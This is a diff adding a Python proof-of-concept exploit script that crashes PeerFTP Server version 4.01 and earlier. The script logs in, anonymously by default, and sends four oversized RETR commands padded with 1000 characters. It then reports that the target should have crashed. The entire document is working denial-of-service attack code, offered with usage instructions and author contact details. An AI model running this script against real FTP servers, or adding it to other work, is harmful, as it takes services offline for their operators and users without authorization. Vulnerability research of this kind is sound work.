@@ -1,0 +1,61 @@
+#!/usr/bin/python
+
+# PeerFTP Server <=v4.01 Remote Crash PoC
+# written by localh0t
+# Date: 19/03/12
+# Contact: mattdch0@gmail.com
+# Follow: @mattdch
+# www.localh0t.com.ar
+
+from socket import *
+import sys, struct, os
+
+if (len(sys.argv) < 3):
+	print "\nPeerFTP Server <=v4.01 Remote Crash PoC"
+        print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
+	sys.exit()
+
+
+def checkDefaultUser(username,password):
+	if username == '':
+		username = "anonymous"
+	if password == '':
+		password = "anonymous@test.com"
+	else:
+		pass
+	return username,password
+
+def createUser():
+	username = raw_input("[!] Insert username (default: anonymous)> ")
+	password = raw_input("[!] Insert password (default: anonymous@test.com)> ")
+	return checkDefaultUser(username,password)
+
+(username,password) = createUser()
+
+print "\n[!] Connecting to %s ..." %(sys.argv[1])
+
+# connect to host
+sock = socket(AF_INET,SOCK_STREAM)
+sock.connect((sys.argv[1],int(sys.argv[2])))
+sock.recv(1024)
+
+print "[!] USERNAME: " + username
+
+sock.send("USER " + username + "\r\n")
+sock.recv(1024)
+
+print "[!] PASSWORD: " + password
+
+sock.send("PASS " + password + "\r\n")
+sock.recv(1024)
+
+print "[!] Sending payload..."
+
+payload = "RETR " + ("X" * 1000) + "\r\n"
+
+for i in range (1, 5):
+	sock.send(payload)
+
+sock.close()
+print "[!] Exploit succeed. Target should crashed."
+sys.exit()
